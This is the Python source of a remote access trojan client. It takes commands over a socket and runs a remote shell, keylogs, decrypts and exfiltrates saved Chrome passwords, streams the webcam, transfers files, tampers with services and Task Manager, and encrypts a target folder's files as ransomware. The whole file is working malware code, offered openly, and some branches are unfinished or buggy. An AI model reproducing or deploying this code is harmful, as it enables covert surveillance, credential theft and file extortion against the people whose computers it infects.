import curses
from genericpath import isfile
from importlib.resources import path
from posixpath import dirname
import socket
import os
import platform
import threading
import time
import getpass
import tkinter
from unittest import case
import win32gui
import json
import urllib
import cv2
import subprocess
import win32crypt
import sqlite3
from datetime import timezone, datetime, timedelta
from Cryptodome.Cipher import AES, DES, DES3
from Crypto.PublicKey import RSA
import base64
import shutil
import tkinter
from tkinter import messagebox
import ctypes
import subprocess
import ctypes.wintypes
import win32serviceutil
from pynput import keyboard
from pynput.mouse import Button, Controller
import pyscreenshot as ImageGrab
import io
import pyautogui
from cryptography.fernet import Fernet
import logging
import tempfile

# global value
clientSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
clientSocket.connect(("127.0.0.1", 5000))
run = True
ransome_key = "abASQWasds234SAQQE=="
encrypt_json_file = 'encrypt_file_record.json'

# messagebox style hex value
MB_OK = 0x0
MB_OKCXL = 0x01
MB_YESNOCXL = 0x03
MB_YESNO = 0x04
MB_HELP = 0x4000
ICON_EXLAIM = 0x30
ICON_INFO = 0x40
ICON_STOP = 0x10

drive_dictionary = {
    "Windows": {                              
                "open" : 'ctypes.windll.WINMM.mciSendStringW(u"open L: type CDAudio alias L_drive", None, 0, None); ctypes.windll.WINMM.mciSendStringW(u"set L_drive door open", None, 0, None)',
                "close": 'ctypes.windll.WINMM.mciSendStringW(u"open L: type CDAudio alias L_drive", None, 0, None); ctypes.windll.WINMM.mciSendStringW(u"set L_drive door closed", None, 0, None)'
               },
    "Darwin":  {
                "open" : 'system("drutil tray open")',
                "close": 'system("drutil tray closed")'
               },
    "Linux":   {
                "open" : 'system("eject cdrom")',
                "close": 'system("eject -t cdrom")'
               },
    "NetBSD":  {
                "open" : 'system("eject cd")',
                "close": 'system("eject -t cd")'
               },
    "FreeBSD": {
                "open" : 'system("sudo cdcontrol eject")',
                "close": 'system("sudo cdcontrol close")'
               }
}

class TMP():
    default_name = "TROJAN_TEMP"
    default_tempdir = {
        "Windows" : "C:\\TEMP\\" + default_name,
        "Linux" : "/tmp/" + default_name,
        "MacOS" : ""
    }
    def __init__(self, dirname=None, *args, **kwargs):
        self.system = platform.system()
        dirname = dirname if dirname else self.default_tempdir.get(self.system)
        self.set_tempdir(dirname)
        
    def set_tempdir(self, name):
        if not name:
            raise ValueError('invalid directory name')
        self.tempdir = os.path.abspath(name)
        if os.path.exists(self.tempdir) and not os.path.isdir(self.tempdir):
            raise FileExistsError('\'%s\' file exists' % self.tempdir)
    
    def get_tempdir(self, subDir=None):
        if subDir:
            return os.path.join(self.tempdir, subDir)
        return self.tempdir
    
    def get_tempname(self, prefix='', suffix='', subDir=None):
        fileName = os.path.join(self.get_tempdir(subDir), prefix + str(time.time()) + suffix)
        return fileName

#ransome
def write_encrypt_record(file_dir, filename, suffix):
    record = {
        "directory" : file_dir,
        "filename" : filename,
        "suffix" : suffix
    }
    with open('C:\\' + encrypt_json_file, 'w') as f:
        f.write(json.dump(record))
    return True

# define function
def os_detect():
    os = platform.system()
    return os

def chat_input(name):
    text = input(name + " : ")
    time.sleep(10)
    return text

def has_admin():
    if os.name == 'nt':
        try:
            # only windows users with admin privileges can read the C:\windows\temp
            temp = os.listdir(os.sep.join([os.environ.get('SystemRoot','C:\\windows'),'temp']))
        except:
            return (os.environ['USERNAME'],False)
        else:
            return (os.environ['USERNAME'],True)
    else:
        if 'SUDO_USER' in os.environ and os.geteuid() == 0:
            return (os.environ['SUDO_USER'],True)
        else:
            return (os.environ['USERNAME'],False)

def get_os_info(info_type=''):
    info = dict()
    if info_type == '':
        vc = cv2.VideoCapture(0)
        ip_inf = ipInfo()
        info = {
            "IP" : ip_inf["ip"],
            "OS" : os_detect(),
            "Version" : platform.version(),
            "Machine" : platform.machine(),
            "User" : getpass.getuser(),
            "Is admin" : "True" if has_admin() else "False",
            "Location" : f'{ip_inf["country"]}-{ip_inf["timezone"]}-{ip_inf["city"]}-({ip_inf["loc"]})',
            "Webcam" : "True" if vc.isOpened() else "False",
            "Ping" : 123,
            "Active Window": win32gui.GetWindowText(win32gui.GetForegroundWindow())
        }
        vc.release()
    elif info_type == 'IP':
        print()
        
    return info

def get_service_info():
    import win32service
    import win32con
    info = dict()
    accessSCM = win32con.GENERIC_READ
    hscm = win32service.OpenSCManager(None, None, accessSCM)
    typeFilter = win32service.SERVICE_WIN32
    stateFilter = win32service.SERVICE_STATE_ALL
    statuses = win32service.EnumServicesStatus(hscm, typeFilter, stateFilter)
    i = 1
    for (short_name, desc, status) in statuses:
        dic = {
            "Service" : short_name,
            "Description" : desc,
            "Status" : status
        }
        info[i] = dic
        i += 1
    return info
    
def ipInfo(addr=''):
    from urllib.request import urlopen
    from json import load
    if addr == '':
        url = 'https://ipinfo.io/json'
    else:
        url = 'https://ipinfo.io/' + addr + '/json'
    res = urlopen(url)
    #response from url(if res==None then check connection)
    data = load(res)
    #will load the json response into data
    return data

def get_fileInfo(fileName):
    if isinstance(fileName, list):
        fileName = os.path.join(fileName)
    fullName = os.path.abspath(fileName)
    
def BrowserStoredPassword():
    def chrome_date_and_time(chrome_data):
        # Chrome_data format is 'year-month-date
        # hr:mins:seconds.milliseconds
        # This will return datetime.datetime Object
        return datetime(1601, 1, 1) + timedelta(microseconds=chrome_data)
    
    def fetching_encryption_key():
        # Local_computer_directory_path will look
        # like this below
        # C: => Users => <Your_Name> => AppData =>
        # Local => Google => Chrome => User Data =>
        # Local State
        local_computer_directory_path = os.path.join(
        os.environ["USERPROFILE"], "AppData", "Local", "Google", "Chrome",
        "User Data", "Local State")
        
        with open(local_computer_directory_path, "r", encoding="utf-8") as f:
            local_state_data = f.read()
            local_state_data = json.loads(local_state_data)

        # decoding the encryption key using base64
        encryption_key = base64.b64decode(
        local_state_data["os_crypt"]["encrypted_key"])
        
        # remove Windows Data Protection API (DPAPI) str
        encryption_key = encryption_key[5:]
        
        # return decrypted key
        return win32crypt.CryptUnprotectData(encryption_key, None, None, None, 0)[1]
    
    def password_decryption(password, encryption_key):
        try:
            
            iv = password[3:15]
            password = password[15:]
            
            # generate cipher
            cipher = AES.new(encryption_key, AES.MODE_GCM, iv)
            
            # decrypt password
            return cipher.decrypt(password)[:-16].decode()
        except:
            try:
                return str(win32crypt.CryptUnprotectData(password, None, None, None, 0)[1])
            except:
                return "No Passwords"
            
    def main_func():
        password_dict = dict()
        key = fetching_encryption_key()
        db_path = os.path.join(os.environ["USERPROFILE"], "AppData", "Local","Google", "Chrome", "User Data", "default", "Login Data")
        filename = "ChromePasswords.db"
        shutil.copyfile(db_path, filename)
        #Connect to database
        db = sqlite3.connect(filename)
        cursor = db.cursor()
        
        #SQL command
        cursor.execute(
            "select origin_url, action_url, username_value, password_value, date_created, date_last_used from logins " #Get data in orgin_url......etc
            "order by date_last_used" #Get data from date_last_used
        )
        
        i = 1
        for row in cursor.fetchall():
            main_url = row[0]
            login_page_url = row[1]
            user_name = row[2]
            decrypted_password = password_decryption(row[3], key)
            date_of_creation = row[4]
            last_usuage = row[5]
            password_dict[i] = {}
            
            if user_name or decrypted_password:
                password_dict[i] = {}
                password_dict[i]["Main URL"] = main_url
                password_dict[i]["Login URL"] = login_page_url
                password_dict[i]["Username"] = user_name
                password_dict[i]["Password"] = decrypted_password
                if date_of_creation != 86400000000 and date_of_creation:
                    password_dict[i]["Creation date"] = str(chrome_date_and_time(date_of_creation))
                if last_usuage != 86400000000 and last_usuage:
                    password_dict[i]["Last Used"] = str(chrome_date_and_time(last_usuage))
                i += 1
            else:
                continue
        cursor.close()
        db.close()
        try:
            os.remove(filename)
        except:
            pass
        return password_dict
    result = main_func()
    return result

def msgBox(title, msg, btstyle, istyle):
    print(title, msg, btstyle, istyle)
    ctypes.windll.user32.MessageBoxA(0, str(msg).encode('utf-8'), str(title).encode('utf-8'), btstyle | istyle)
    
def scan_port():
    port_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    open_port_dict = {}
    for i in range(0, 65535):
        try:
            port_socket.connect(("127.0.0.1", i))
            port_socket.shutdown(2)
            open_port_dict[i] = socket.getservbyport(i, "tcp")
        except:
            pass
    return open_port_dict

global listen

def keylogger():
    #logging.basicConfig(filename=("keylogger.txt"), level=logging.DEBUG, format=" %(asctime)s - %(message)s")
    def on_press(key):
        try:
            clientSocket.send(f"KeyLogger|{str(key)}".encode('utf-8'))
        except:
            pass
    
    def on_release(key):
        from pynput.keyboard import Key
        if key == Key.esc:
            return False
               
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

#Screenshot function 
logger = logging.getLogger(__name__)
try:
    import wx
    def screenshot_grab(filename):
        app = wx.App()
        screen = wx.ScreenDC()
        size = screen.GetSize()
        bmp = wx.Bitmap(size[0], size[1])
        mem = wx.MemoryDC(bmp)
        mem.Blit(0, 0, size[0], size[1], screen, 0, 0)
        del mem #Release bitmap
        bmp.SaveFile(filename, wx.BITMAP_TYPE_PNG)
        return filename
    screenshot_module = 'wx'
    logger.error('screenshot grabber: wxPython')
except:
    try:
        def screenshot_grab(filename=None):
            image = ImageGrab.grab()
            if filename:
                image.save(filename)
                return filename
            else:
                with io.BytesIO() as fp:
                    image.save(fp, 'PNG')
                    fp.seek(0)
                    return fp.read()
        screenshot_module = 'pyscreenshot'
        logger.error('pyscreenshot')
    except:
        def screenshot_grab(filename=None):
            return None
        screenshot_module = None
        logger.error('screenshot grabber: failed')
        
ev = threading.Event()
ev.set()

def main():
    while True:
        data = clientSocket.recv(2048)
        print(data)
        data_to_list = str(data.decode()).split('|')
        if data_to_list[0] == "Shell":
            result = subprocess.check_output(data_to_list[1], shell=True)
            clientSocket.send(b"Shell|" + result)
        elif data_to_list[0] == "Info":
            print(data_to_list[1], "<-")
            if data_to_list[1] == "":
                print(data_to_list[1])
                clientSocket.send(b"Info|" + json.dumps(get_os_info()).encode('utf-8'))
            else:
                if data_to_list[1] == "Browser":
                    x = BrowserStoredPassword()
                    clientSocket.send(b"Browser|" + json.dumps(BrowserStoredPassword()).encode('utf-8'))
        elif data_to_list[0] == "Chat":
            if data_to_list[1] == "GoChat":
                print("You are in the chat!")
            elif data_to_list[1] == "ChatText":
                print("init test")
                print("Here is the test")
                t = threading.Thread(target=chat_input("Victim"))
                t.start()
                print("test b")
                recv_chat_text = clientSocket.recv(1024)
                print(str(recv_chat_text.decode()).split('|')[1])
                print("test c")
        elif data_to_list[0] == "Port":
            if data_to_list[1] == "List":
                clientSocket.send(b"Port|" + json.dumps(scan_port()).encode())
        elif data_to_list[0] == "Webcam":
            run = True
            if data_to_list[1] == "Stop":
                run = False
            vc = cv2.VideoCapture(0)
            if vc.isOpened(): # try to get the first frame
                rval, frame = vc.read()
            else:
                rval = False
            import numpy
            while rval:
                rval, frame = vc.read()
                image_bytes = cv2.imencode('.jpg', frame)[1].tobytes()
                
                data = numpy.array(image_bytes)
                if run == True:
                    clientSocket.send(data.tobytes())
                key = cv2.waitKey(20)
                if run == False: # exit
                    time.sleep(5)
                    break
            vc.release()
        elif data_to_list[0] == "MsgBox":
            #initial if none
            bstyle = int(data_to_list[3])
            istyle = int(data_to_list[4])
            
            def bswitch(var):
                return {
                    1 : 0x0,
                    2 : 0x01,
                    3 : 0x02,
                    4 : 0x03,
                    5 : 0x04,
                }.get(var, 0x0)
            def iswitch(var):
                return {
                    1 : 0x10,
                    2 : 0x30,
                    3 : 0x40,
                }.get(var, 0x10)
            BUTTON = bswitch(bstyle)
            ICON = iswitch(istyle)
            msgBox(data_to_list[1], data_to_list[2], BUTTON, ICON)
        elif data_to_list[0] == "CdDrive":
            if data_to_list[1] == "Open":
                exec(drive_dictionary[os_detect()]["open"])
            elif data_to_list[1] == "Close":
                exec(drive_dictionary[os_detect()]["close"])
        elif data_to_list[0] == "Taskbar":
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            if data_to_list[1] == "Hide":
                win32gui.ShowWindow(hwnd, 0)
            elif data_to_list[1] == "Show":
                win32gui.ShowWindow(hwnd, 5)
        elif data_to_list[0] == "StartOrb":
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            hwnd = win32gui.FindWindowEx(hwnd, 0, "Start", None)
            if data_to_list[1] == "Hide":
                win32gui.ShowWindow(hwnd, 0)
            elif data_to_list[1] == "Show":
                win32gui.ShowWindow(hwnd, 5)
        elif data_to_list[0] == "WinClock":
            hwnd = win32gui.FindWindow("Shell_TrayWnd", None)
            hwnd = win32gui.FindWindowEx(hwnd, 0, "TrayNotifyWnd", None)
            hwnd = win32gui.FindWindowEx(hwnd, 0, "TrayClockWClass", None)
            if data_to_list[1] == "Hide":
                win32gui.ShowWindow(hwnd, 0)
            elif data_to_list[1] == "Show":
                win32gui.ShowWindow(hwnd, 5)
        elif data_to_list[0] == "Mouse":
            run = True
            current_position = pyautogui.position()
            if data_to_list[1] == "Lock":
                while run:
                    pyautogui.moveTo(current_position[0], current_position[1])
            elif data_to_list[1] == "UnLock":
                run = False
            elif data_to_list[1] == "Crazy":
                if data_to_list[2] == "Start":
                    pass
                elif data_to_list[2] == "Stop":
                    pass
            elif data_to_list[1] == "Hide":
                curses.curs_set(0)
            elif data_to_list[1] == "Show":
                curses.curs_set(1)
        elif data_to_list[0] == "TaskManager":
            import winreg
            registry_path: str = r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System"
            registry_name = "DisableTaskMgr"
            if data_to_list[1] == "Disable":
                value = 1
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
                winreg.CloseKey(reg_key)
            elif data_to_list[1] == "Enable":
                value = 0
                reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
                winreg.CloseKey(reg_key)
        elif data_to_list[0] == "Manager":
            if data_to_list[1] == "Services":
                service_name = data_to_list[3]
                if data_to_list[2] == "List":
                    clientSocket.send(b"Manager|" + json.dumps(get_service_info()).encode('utf-8'))
                elif data_to_list[2] == "Start":
                    win32serviceutil.StartService(serviceName=service_name)
                elif data_to_list[2] == "Stop":
                    win32serviceutil.StopService(serviceName=service_name)
                elif data_to_list[2] == "Restart":
                    win32serviceutil.RestartService(serviceName=service_name)
                elif data_to_list[2] == "Remove":
                    win32serviceutil.RemoveService(serviceName=service_name)
            elif data_to_list[1] == "Port":
                pass
            elif data_to_list[1] == "Process":
                pass
            elif data_to_list[1] == "Registry":
                pass
            elif data_to_list[1] == "File":
                if data_to_list[2] == "Download":
                    fp = open(data_to_list[3], 'rb')
                    f_data = fp.read(1024)
                    while f_data:
                        clientSocket.send(f_data)
                        f_data = fp.read(2048)
                        print("Read")
                        if not f_data:
                            break
                    fp.close()
                    print("Done")
                    clientSocket.send(b"Done")
                elif data_to_list[2] == "Upload":
                    f = open(data_to_list[3], 'wb')
                    f_data = clientSocket.recv(1024)
                    while (f_data):
                        f.write(f_data)
                        f_data = clientSocket.recv(1024)
                        try:
                            if f_data.decode() == "Done":
                                
                                break
                        except:
                            pass
                    f.close()
                    print("File done")
        elif data_to_list[0] == "ScreenShot":
            result = {}
            tempObj = TMP()
            tempName = tempObj.get_tempdir('screenshot_', '.png', 'SCREENSHOT')
            dirName = os.path.dirname(tempName)
            if dirName and not os.path.exists(dirName):
                os.makedirs(dirName)
            tempName = screenshot_grab(tempName) # Grap
            if not tempName:
                result['stderr'] = 'grab screenshot fails'
            #result = 
        elif data_to_list[0] == "Keylogger":
            if data_to_list[1] == "Start":
                threading.Thread(target=keylogger).start()
            elif data_to_list[1] == "Stop":
                pyautogui.press("esc")
        elif data_to_list[0] == "Ransome":
            target_dir = data_to_list[3]
            file_list = []
            fernet = Fernet(ransome_key.encode('utf-8'))
            if data_to_list[1] == "Encrypt":
                if data_to_list[2] == "Folder":
                    for file in os.listdir(target_dir):
                        if os.path.isfile(os.path.join(target_dir, file)):
                            file_list.append(file)
                            suffix = os.path.splitext(file)[1]
                            write_encrypt_record(target_dir, file, suffix)
                            with open(file, 'rb') as f:
                                original = f.read()
                            encrypted = fernet.encrypt(original)
                            with open(file, 'wb') as encrypt_file:
                                encrypt_file.write(encrypted)
                            with open('C:\\' + encrypt_json_file, 'r') as j:
                                data = json.load(j)
                            encrypted_filename = data["filename"].replace(suffix, '.pyshell')
                            os.rename(file, encrypted_filename)
                elif data_to_list[2] == "File":
                    print()
            elif data_to_list[1] == "Decrypt":
                print()
    clientSocket.close()
            
if __name__ == '__main__':
    import win32con
    invisible = False
    if invisible == True:
        this_program = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(this_program, win32con.SW_HIDE)
    main()